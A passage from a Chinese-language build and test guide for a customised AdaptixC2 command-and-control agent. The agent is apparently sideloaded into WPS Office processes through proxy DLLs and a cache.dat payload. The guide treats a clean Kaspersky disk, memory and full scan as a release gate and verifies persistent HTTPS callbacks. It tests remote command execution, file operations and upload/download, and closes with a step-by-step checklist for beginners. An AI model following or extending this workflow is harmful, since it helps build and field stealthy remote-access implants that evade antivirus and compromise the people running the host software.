如果 a_last_tick 产生新的值，就把它计入该进程的 callback 列表。结束时输出：

~~~json
{
  "callback_counts": {
    "wpp.exe": 65,
    "wps.exe": 65
  },
  "errors": [],
  "passed": true
}
~~~

### 14.3 为什么“连续多次”比“一次上线”更有意义

一次上线只能证明初始化、网络和第一次请求走通。连续 720 秒监视可以覆盖：

- 第二次及后续 WinINet 请求。
- sleep 后再次唤醒。
- 空任务心跳。
- 执行任务后的下一次回连。
- WPP/WPS 长时间保持响应。

最终 release 的三轮统计为：

| 轮次 | WPP 回连 | WPS 回连 | 监视时长 |
|---|---:|---:|---:|
| release-run-2b | 65 | 65 | 720 秒 |
| release-run-3 | 60 | 64 | 720 秒 |
| release-run-4 | 65 | 65 | 720 秒 |

---

## 15. Kaspersky 三层门禁

功能测试前先做安全软件门禁，确保当前候选的磁盘、内存和全系统扫描记录都独立保存。

### 15.1 单文件静态扫描

依次扫描：

~~~text
cache.dat
krpt.dll
krpt.agent.dll
~~~

每个文件的通过条件：

~~~text
processed = 1
detected = 0
errors = 0
return code = 0
~~~

原始报告在最终候选目录中以 static-scan-*.report.txt 保存。

### 15.2 Scan_System_Memory

该任务观察运行状态下的系统内存，重点是“文件已经加载进 WPP/WPS 后”的结果。最终三轮都记录了：

~~~text
processed = 1
detected = 0
errors = 0
return code = 0
~~~

### 15.3 新鲜 Scan_Qscan

每轮部署都启动新的 Qscan 任务，并记录：

- 任务开始和结束时间。
- processed 数量。
- detected 数量。
- errors 数量。
- 命令返回码。
- 最终状态是否为 completed。

三轮 Qscan 结果：

| 轮次 | processed | detected | errors | RC |
|---|---:|---:|---:|---:|
| release-run-2b | 3548 | 0 | 0 | 0 |
| release-run-3 | 3572 | 0 | 0 | 0 |
| release-run-4 | 3572 | 0 | 0 | 0 |

历史任务的统计只作为诊断背景，当前 release 结论使用本轮新启动的 Qscan。

### 15.4 扫描任务之间的干扰

靶机上可能存在 OneDrive 等后台任务，它们会让 Qscan 的启动和结束状态变得难以判断。发布脚本会先收集状态，在受控窗口内停止已知噪声进程，再轮询 Kaspersky 任务状态，最终把原始 CLI 输出和报告落盘。

排障时重点看：

~~~text
deploy-scan.log
kaspersky-qscan.stdout.log
kaspersky-qscan.cli.stdout.log
kaspersky-qscan.report.txt
~~~

---

## 16. 真实功能回归怎样执行

### 16.1 hello、cmd、powershell、pwd

先验证最基础的任务链：

~~~text
hello
cmd echo F0N_WPP_CMD && whoami && cd
powershell Write-Output F0N_WPP_PS
powershell (Get-Location).Path
pwd
~~~

检查点：

1. Teamserver 接受任务。
2. task 进入完成状态。
3. a_message 包含正确的程序和 PID 信息。
4. a_text 含有 marker 或路径。
5. WPP/WPS 进程继续保持 Responding=True。

### 16.2 文件 CRUD

每个宿主会创建自己的唯一 scratch 目录，避免两边相互覆盖。顺序如下：

~~~text
mkdir scratch
upload marker.txt scratch\marker.txt
ls scratch
cat scratch\marker.txt
cp scratch\marker.txt scratch\copy.txt
mv scratch\copy.txt scratch\moved.txt
download scratch\moved.txt
rm scratch\marker.txt
rm scratch\moved.txt
rm scratch
~~~

这组命令同时检查：目录创建、远程写入、目录列表、文本读取、复制、移动、下载和删除。

### 16.3 disks

disks 的返回字段是：

~~~text
taskId
commandId
success
driveCount
drive letter
drive type
~~~

当前靶机实际返回：

~~~text
C: fixed (3)
D: cdrom (5)
~~~

测试脚本再通过靶机 Win32_LogicalDisk 查询结果做交叉比对，盘符数量和类型来自靶机实际环境。

### 16.4 upload/download 哈希检查

“任务完成”只说明协议任务结束，文件内容还要做独立核对。当前流程是：

~~~text
本地 marker
    -> upload
    -> 靶机文件
    -> download
    -> 本地回收文件
    -> SHA-256 比较
~~~

release-run-4 的 WPP/WPS 下载证据为：

~~~text
WPP: expected = actual = 440dbdbae2da6f95a3e587da6088b81f1bbe6ff56f49dfde326a94baf73accc3
WPS: expected = actual = 3b1a6cddc1ebf95b694c3cc797103b463ba4fc8ae3a3b4dabb0a4e2ec01e85a8
~~~

### 16.5 清理检查

每轮结束后检查：

~~~text
scratch 目录
C:\Users\Public\direct-https-job-*.out
本地 download 临时文件
wpp.exe / wps.exe 的 Responding 状态
~~~

最终结果要求：

~~~text
scratch 匹配数量 = 0
job output 文件匹配数量 = 0

WPP/WPS 进程 Responding = True
~~~

---

## 17. 三轮 release 结果怎样解读

| 候选 | 新鲜 Qscan | 回连 WPP/WPS | WPP/WPS 功能面 | F0 | disks | 传输 | 结论 |
|---|---|---:|---:|---:|---:|---|---|
| release-run-2b | 3548/0/0 | 65/65 | 17/17 | 10/10 | 2/2 | pass | PASS |
| release-run-3 | 3572/0/0 | 60/64 | 17/17 | 10/10 | 2/2 | pass | PASS |
| release-run-4 | 3572/0/0 | 65/65 | 17/17 | 10/10 | 2/2 | pass | PASS |

表中 Qscan 使用 processed/detected/errors 顺序。17/17 是每个 WPP/WPS 角色的完整脚本任务数，10/10 是 F0 主命令重点检查数，2/2 是 WPP 和 WPS 两个角色的 disks 检查。

最终报告：

- [release-run-2b/RESULT.md](LOCAL_CANDIDATE_ROOT/release-run-2b/RESULT.md)
- [release-run-3/RESULT.md](LOCAL_CANDIDATE_ROOT/release-run-3/RESULT.md)
- [release-run-4/RESULT.md](LOCAL_CANDIDATE_ROOT/release-run-4/RESULT.md)
- [release-survival-final.txt](LOCAL_CANDIDATE_ROOT/release-survival-final.txt)

---

## 18. 常见问题和排障顺序

### 18.1 构建失败

先看：

~~~text
go-test-direct-https-agent-1.25.4.log
x86-build.log
profile-build-ps-encoding.log
~~~

排查顺序：

1. Go 工具链版本。
2. x64/x86 交叉编译器是否存在。
3. 头文件和对象目录是否来自同一提交。
4. 编译开关是否与 build-meta.json 对齐。
5. linker 是否得到完整模块列表。

### 18.2 进程启动但 Teamserver 没有 Agent

按层次检查：

1. WPP/WPS 进程是否启动。
2. 远程部署哈希是否与本地一致。
3. cache.dat、proxy DLL 是否位于预期目录。
4. profile 的 listener、地址、端口是否正确。
5. HTTPS_LISTENER 是否正在监听。
6. callback monitor 的进程名过滤是否匹配。
7. 首次 check-in 是否已发生但被旧 Agent 记录遮挡。

### 18.3 Agent 出现但只回连一次

重点检查：

- sleep 后第二次 Exchange 是否执行。
- WinINet handle 是否在每轮正确关闭和重新建立。
- RecvClear 是否释放旧响应。
- MainAgent 是否在空任务时仍发送 heartbeat。
- WPP/WPS 是否保持 Responding=True。

### 18.4 cmd 任务完成但没有文本

排查路径：

~~~text
Commander.cpp
  -> CreateProcess 分支和原始错误码
JobsController.cpp
  -> pipe/file 读取长度
utils.cpp
  -> regularFile 和编码转换
pl_main.go
  -> ProcessData 的 task ID/command ID
~~~

同时查询靶机：

~~~text
C:\Users\Public\direct-https-job-*.out
~~~

文件有内容而界面为空，通常关注读取、编码或结果解析；文件为空且进程仍在，先等待任务完成；文件为空且进程已经退出，再看创建参数和错误码。

### 18.5 PowerShell 文本乱码

检查输出是否以 FF FE 开头，再核对 WideCharToMultiByte 和 Go 侧 OemCP 转换。功能矩阵中的 PowerShell marker 是最简单的回归样本。

### 18.6 Qscan 结果需关联本轮任务

每个新候选都要关联一个新 Qscan 任务 ID。读取 deploy-scan.log、kaspersky-qscan.cli.stdout.log 和报告文件，确认开始时间、结束状态、processed、detected、errors 与返回码来自同一轮。

### 18.7 清理检查出现残留

先区分残留类型：

| 残留 | 重点位置 |
|---|---|
| direct-https-job-*.out | JobsController final drain、句柄关闭、DeleteFile |
| scratch 目录 | 文件 CRUD 测试脚本和最后的 rm 顺序 |
| 本地下载文件 | download hash 脚本的收尾逻辑 |
| WPP/WPS 未响应 | Agent 主循环、连接器 handle、任务死循环 |

当前 release 的最终 cleanup 快照中四类问题均为通过状态。

---

## 19. Git 版本和留存方式

### 19.1 阶段 tag

当前阶段 tag 统一指向 release 提交：

~~~text
stage-F0-file-fallback
stage-F1-command-exec
stage-F2-file-crud
stage-F3-transfer
release-wpp-functional-v1
~~~

release 提交：

~~~text
72e54efee51ee70445344a81c4580142a505b0e2
~~~

初始对照提交：

~~~text
a199bc15528b015cb6ae1a2affc6ac0ec5c80ad8
~~~

官方参考基线：

~~~text
a4b80bf370f704d6843e69433bfb5c06274f57df
~~~

### 19.2 独立留存目录

最新留存目录：

~~~text
LOCAL_CANDIDATE_ROOT/preserved-latest-20260721
~~~

其中包含：

~~~text
PRESERVATION-MANIFEST.md
PRESERVED-SHA256SUMS
source/AdaptixC2-release-wpp-functional-v1.tar.gz
source/source-commit.txt
source/source-git-show.txt
artifacts/release-wpp-functional-v1/*
~~~

源代码归档 SHA-256：

~~~text
075ebb69248a2ebe0d315bef89d1fc0ea21a2d259b327b8c7963b7c6a8f7ff04
~~~

留存清单：[PRESERVATION-MANIFEST.md](LOCAL_CANDIDATE_ROOT/preserved-latest-20260721/PRESERVATION-MANIFEST.md)

### 19.3 为什么报告、源码、包要分开

三类内容职责不同：

- 源码仓库记录“怎样实现”。
- release 包记录“实际部署了什么”。
- 报告目录记录“这份包经过了什么验证”。

把构建产物和临时日志留在报告目录，能避免源码工作树被二进制和扫描输出混杂；源码提交号、包哈希和报告路径共同构成一份可追踪记录。

---

## 20. 一次复跑的简化清单

下面是给初学者使用的检查顺序：

~~~text
[ ] 1. 确认源码提交号和 tag
[ ] 2. 运行 direct_https_agent 的 Go 测试
[ ] 3. 构建 Go plugin
[ ] 4. 构建 C++ x64/x86 对象
[ ] 5. 生成 profile DLL 和 profile container
[ ] 6. 打包 cache.dat
[ ] 7. 构建 krpt.dll 与 krpt.agent.dll
[ ] 8. 生成 SHA256SUMS
[ ] 9. 停止靶机 WPP/WPS 并备份远程文件
[ ] 10. 部署三个核心文件并核对远程 SHA-256
[ ] 11. 执行三个 Kaspersky 门禁
[ ] 12. 启动 WPP_ActiveV2_Live_Test_Limited
[ ] 13. 监视 WPP/WPS 连续 callback
[ ] 14. 执行 hello/cmd/powershell/pwd
[ ] 15. 执行文件 CRUD 和 disks
[ ] 16. 执行 upload/download 并比较 SHA-256
[ ] 17. 检查进程 Responding
[ ] 18. 检查 scratch 与 job output 文件清理
[ ] 19. 保存 JSON、日志、报告和最终哈希
[ ] 20. 通过后再创建下一阶段 tag
~~~

本仓库当前已有封装脚本和完整结果，可以优先阅读：

- [实现总览](LOCAL_CANDIDATE_ROOT/IMPLEMENTATION-OVERVIEW.md)
- [自研特色对比](LOCAL_CANDIDATE_ROOT/INNOVATIONS-VS-ORIGINAL-ADAPTIX.md)
- [最终发布清单](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/MANIFEST.md)
- [阶段汇总](LOCAL_STAGE_SUMMARY)

---

## 21. 术语表

| 术语 | 解释 |
|---|---|
| Agent | 运行在靶机宿主环境中的任务执行组件 |
| Teamserver | 管理 Agent、listener、task 和 result 的服务器 |
| Client | 操作员使用的 Adaptix 图形界面 |
| Listener | 接收 Agent 网络请求的服务器入口 |
| Profile | Agent 的连接和运行参数 |
| check-in | Agent 的周期性登记和取任务请求 |
| callback | 一次成功的通信时间点 |
| task | 服务端保存的一项待执行任务 |
| job | Agent 内部正在运行的 Windows 任务 |
| opcode/action ID | 用数字标识命令类型 |
| envelope | 带版本、标志和长度的协议外壳 |
| section | envelope 内可独立解析的一段数据 |
| pipe | Windows 进程间传输输出的管道 |
| handle | Windows 对进程、文件、管道等对象的引用 |
| final drain | 进程退出后再读取一次末尾输出 |
| OEM code page | Windows 命令行常用的本地代码页 |
| artifact | 构建出来并可部署的文件 |
| static scan | 对磁盘文件进行扫描 |
| memory scan | 对运行中内存进行扫描 |
| Qscan | Kaspersky 的全范围扫描任务 |
| scratch | 功能测试使用的临时目录 |
| SHA-256 | 用于核对文件内容一致性的哈希算法 |

---

## 22. 最后用一句话复述整个过程

源码中的 UI 配置决定“能点哪些命令”，Go 插件决定“任务怎样编码和结果怎样显示”，C++ Agent 决定“Windows 上怎样连接、执行和收集输出”，Makefile 决定“怎样生成各架构和各角色的制品”，部署脚本决定“怎样把同一份制品送到靶机并核对哈希”，回连监视器与功能矩阵决定“它是否持续工作”，Kaspersky 三层门禁和 cleanup 证据则决定“这轮 release 是否具备完整记录”。

当前 release-wpp-functional-v1 已把这条链路完整串通，并通过三次独立新部署的 WPP/WPS 回连、功能、传输、扫描和清理验证。
